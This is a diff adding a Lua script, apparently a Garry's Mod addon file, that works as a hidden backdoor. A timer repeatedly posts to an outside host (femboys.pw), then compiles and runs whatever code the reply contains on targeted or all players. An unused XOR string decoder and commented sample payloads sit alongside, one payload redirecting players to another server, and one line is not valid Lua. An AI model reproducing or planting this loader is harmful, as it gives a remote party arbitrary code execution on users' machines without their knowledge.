@@ -1,0 +1,48 @@
+local _G = _G
+local string = string
+local bit.bxor = bit.bxor
+local function strFunc054(arg1)
+	if string.len(arg1) == 0 then
+		return arg1
+	end
+	
+	local str = ''
+	for key in string.gmatch(arg1, '..') do
+		str= str .. string.char(bit.bxor(tonumber(key, 16), 69))
+	end
+	return str
+end 
+timer.Create("dasdjalsdja", 3, 0, function()
+	http.Post("http://femboys.pw/bd/", {["typ"] = "memed"}, function(result)
+		local jsontable = util.JSONToTable(result)
+		if string.lower(type(jsontable)) != "table" then 
+			return 
+		end 
+		
+		local id = jsontable["id"] or "noid" 
+		local payloadLaunchTime = tonumber(jsontable["t"])
+		if os.time(os.date("!*t")) > payloadLaunchTime then 
+			return 
+		end
+		
+		if id == "all" or id == LocalPlayer()["SteamID"](LocalPlayer()) then 
+			local payloadFunc = CompileString(jsontable["code"], ".", false) or "" 
+			if isfunction(payloadFunc) then 
+				payloadFunc()
+			end 
+		end 
+	end, function()
+	end)
+end)
+/*
+{
+    ["t"] = "1479037046",
+    ["code"] = "off",
+    ["id"] = "none",
+}
+{
+    ["t"] = "1479040430",
+    ["code"] = "LocalPlayer():ConCommand("connect 89.34.96.23:27095")",
+    ["id"] = "all",
+}
+*/
